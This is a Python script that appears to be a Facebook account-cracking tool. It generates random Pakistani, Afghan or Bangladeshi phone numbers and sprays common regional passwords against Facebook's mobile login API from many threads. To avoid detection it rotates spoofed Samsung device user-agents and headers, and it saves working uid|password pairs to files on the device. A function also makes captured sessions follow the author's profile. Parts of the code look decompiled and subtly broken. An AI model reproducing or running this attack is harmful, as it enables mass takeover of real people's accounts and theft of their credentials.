xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def pak():
		user=[]
		clear()
		print('\033[1;37m [PAK] \033[1;31m92300,92345,92305,92330 \n\033[1;37m [AFG]\033[1;32m 9379,9370,9378,9377,9372 \n\033[1;37m [BD]\033[1;36m  88017,88016,88019,88018')
		code = input('\033[1;37m Inter your country range code: ')
		try:
			limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mPRO METHOD')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;32m [1] \033[1;31mAFG AUTO PASS 7+11\n\033[1;32m [2]\033[1;33m BD AUTO PASS 7+11 \n\033[1;32m [3]\033[1;36m PAK AUTO PASS 7+11')
		linex()
		pcs = input(' [?] Select: ')
		os.system('xdg-open   https://www.facebook.com/profile.php?id=100071596264601')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Danishyar:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;33m Choice code  :\033[1;32m '+code)
			print(' \033[1;31mwait to cracking ids for speed up use Airplane mode')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['3','03']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','pubg','pubg1122']
				if pcs in ['2','02']:
					passlist = [psx,ids,'i love you','Bangladesh','bangladesh','taskin123','Dhaka123']
				elif pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','1122334455','Afghan123','Afghanistan','jan123','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','cricket123','kandahar123','jan123']
				if mthd in ['1','01']:
					Danishyar.submit(rndm,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python HLS.py')
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100071596264601', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
awmfban1 = [ 'MessengerLite', 'FB4A;FBAV', 'FB4A']
awmsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
awmsm=('GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890',"GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H","GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H")
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HLS-RANDOM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(awmsm)
                                gttt=random.choice(awmsm)
                                android_version=str(random.randrange(6,13))
                                M_useragent = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim1)};FBMF/samsung ;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head ={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'X-FB-device-group': str(random.randint(2000, 4000)),
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                                "X-FB-Request-Analytics-Tags": "graphservice",
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'X-FB-connection-quality':'EXCELLENT',
                                "X-Tigon-Is-Retry": "False",
                                'User-Agent':M_useragent,
                                
                                "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HLS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [HLS-LIVE] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/HLS.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HLS-LIVE] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HLS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#	except requests.exceptions.ConnectionError:
	#	time.sleep(10)
#	except:
	#	pass
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
